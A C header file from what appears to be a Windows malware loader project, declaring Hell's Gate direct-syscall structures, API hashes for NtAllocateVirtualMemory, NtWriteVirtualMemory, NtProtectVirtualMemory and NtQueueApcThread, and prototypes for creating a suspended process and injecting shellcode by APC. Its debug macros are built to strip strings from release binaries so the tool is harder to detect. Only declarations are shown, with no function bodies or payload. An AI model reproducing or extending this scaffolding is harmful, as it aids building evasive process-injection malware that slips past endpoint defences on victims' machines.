#pragma once
#include <windows.h>
#include <stdio.h>
#include "structs.h"

// If the following line is set, verbose debug messages are printed to the console windows
#define DEBUG

/// Macros
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

#ifdef DEBUG
// The following macros can be used to display debugging information. 
// The messages are only shown if DEBUG mode is enabled.

#define OKAY(MSG, ...) printf("[+] " MSG "\n", ##__VA_ARGS__)
#define OKAY_W(MSG, ...) wprintf(L"[+] " MSG L"\n", ##__VA_ARGS__)
#define INFO(MSG, ...) printf("[#] " MSG "\n", ##__VA_ARGS__)
#define INFO_W(MSG, ...) wprintf(L"[#] " MSG L"\n", ##__VA_ARGS__)
#define WARN(MSG, ...) fprintf(stderr, "[-] " MSG "\n", ##__VA_ARGS__)
#define WARN_W(MSG, ...) fwprintf(stderr, L"[-] " MSG L"\n", ##__VA_ARGS__)
#define PRINT_ERROR(FUNCTION_NAME)                                        \
    do {                                                                  \
        fprintf(stderr,                                                   \
                "[!] " FUNCTION_NAME " failed, error: %d. [%s:%d]  \n",   \
                GetLastError(), __FILE__, __LINE__);                      \
    } while (0)
#define PRINT_NTERROR(FUNCTION_NAME)                                      \
    do {                                                                  \
        fprintf(stderr,                                                   \
                "[!] " FUNCTION_NAME " failed, error: 0x%X. [%s:%d]  \n", \
                STATUS, __FILE__, __LINE__);                              \
    } while (0)

#endif 

#ifndef DEBUG
// The following macros will be deleted by the preprocessor, since they include no code. 
// This enables the use of the macros in debug mode, but they will not contain strings that are visible in the binary.

#define OKAY(MSG, ...) 
#define OKAY_W(MSG, ...)
#define INFO(MSG, ...)
#define INFO_W(MSG, ...)
#define WARN(MSG, ...) 
#define WARN_W(MSG, ...) 
#define PRINT_ERROR(FUNCTION_NAME)                                        
#define PRINT_NTERROR(FUNCTION_NAME)                                       

#endif 

void PRINT_BYTES(unsigned char* arr, SIZE_T size);

#define NtAllocateVirtualMemory_djb2 0xF5BD373480A6B89B
#define NtWriteVirtualMemory_djb2 0x68A3C2BA486F0741
#define NtProtectVirtualMemory_djb2 0x858BCB1046FB6A37
#define NtQueueApcThread_djb2 0x7073ED9F921A0267

// VX Tables
typedef struct _VX_TABLE_ENTRY {
    PVOID   pAddress;
    DWORD64 dwHash;
    WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
    VX_TABLE_ENTRY NtAllocateVirtualMemory;
    VX_TABLE_ENTRY NtProtectVirtualMemory;
    VX_TABLE_ENTRY NtWriteVirtualMemory;
    VX_TABLE_ENTRY NtQueueApcThread;
} VX_TABLE, * PVX_TABLE;

// External function prototypes
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();

// Function prototypes
PTEB RtlGetThreadEnvironmentBlock(); 
DWORD64 djb2(PBYTE str);
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory); 
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry); 
PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len); 

BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT PDWORD pdwProcessId, OUT PHANDLE phProcess, OUT PHANDLE phThread); 
BOOL ApcInjectionViaDirectSyscalls(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pShellcode, IN SIZE_T sSize); 